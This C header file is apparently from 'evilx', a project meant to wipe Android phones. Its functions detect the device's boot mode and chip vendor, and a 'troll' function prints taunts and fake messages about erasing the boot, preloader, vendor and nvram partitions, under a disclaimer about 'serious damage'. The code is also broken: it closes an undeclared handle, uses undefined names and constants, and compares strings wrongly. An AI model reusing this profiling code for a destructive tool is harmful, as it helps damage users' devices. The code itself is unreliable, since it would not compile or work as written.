#ifndef _OTHERS_H_
#define _OTHERS_H_

// required headers
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>

/*

███████╗██╗   ██╗ ██╗██╗      ██╗  ██╗
██╔════╝██║   ██║ ██║██║      ╚██╗██╔╝
█████╗  ██║   ██║ ██║██║       ╚███╔╝ 
██╔══╝  ╚██╗ ██╔╝ ██║██║       ██╔██╗ 
███████╗ ╚████╔╝ ██║███████╗ ██╔╝ ██╗
╚══════╝  ╚═══╝   ╚═╝╚══════╝╚═╝  ╚═╝

By YZBruh

*/

/*
 * Copyright 2024 evilx
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at

 *     http://www.apache.org/licenses/LICENSE-2.0

 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// I do not accept responsibility or responsibilities. The user or user is responsible for any serious damage that may occur!

// For short and simple output
void error(const char *err_msg) {
    fprintf(stderr, ANSI_COLOR_RED "%s" ANSI_COLOR_RESET, err_msg);
    exit(EXIT_FAILURE);
}

// check what mode the device is in
void bootmode() {
    int evilx_boot_mode;
    FILE *modep = popen("getprop ro.bootmode", "r");
    char mode[25];
    if (fgets(mode, sizeof(mode), modep) != NULL) {
        if (strstr(mode, "recovery") != NULL) {
            evilx_boot_mode = 1;
        } else if (strcmp(mode, "normal") == 0) {
            evilx_boot_mode = 0;
        } else {
            error("İnvalid boot mode!\n");
        }
    }
    pclose(fp);
}

// get processor information
void get_soc() {
    char *evilx_using_soc;
    FILE *socp;
    char buffer[96];
    socp = popen("cat /proc/cpuinfo | grep -i mediatek", "r");
    if (fgets(buffer, sizeof(buffer)-1, socp) != NULL) {
        evilx_using_soc = mtk;
    } else {
        pclose(socp);
        socp = popen("cat /proc/cpuinfo | grep -i qualcomm", "r");
        if (fgets(buffer, sizeof(buffer)-1, socp) != NULL) {
            evilx_using_soc = qcom;
        } else {
            pclose(socp);
            socp = popen("cat /proc/cpuinfo | grep -i unisoc", "r");
            if (fgets(buffer, sizeof(buffer)-1, socp) != NULL) {
                evilx_using_soc = unisc;
            } else {
                error("Unknown processor manufacturer!\n");
            }
        }
    }
    pclose(socp);
}

// have a nervous breakdown :D
const void troll() {
    printf(ANSI_COLOR_RED "Now you're fucked!\n\n");
    printf(ANSI_COLOR_GREEN "Erasing boot...\n");
    printf(ANSI_COLOR_YELLOW "Erasing preloader...\n");
    printf(ANSI_COLOR_BLUE "Erasing vendor...\n");
    printf(ANSI_COLOR_CYAN "Erasing nvram...\n");
    printf(ANSI_COLOR_MAGENTA "Okay, it's clear you're fucked!\n" ANSI_COLOR_RESET);
}

// that's enough xD

#endif
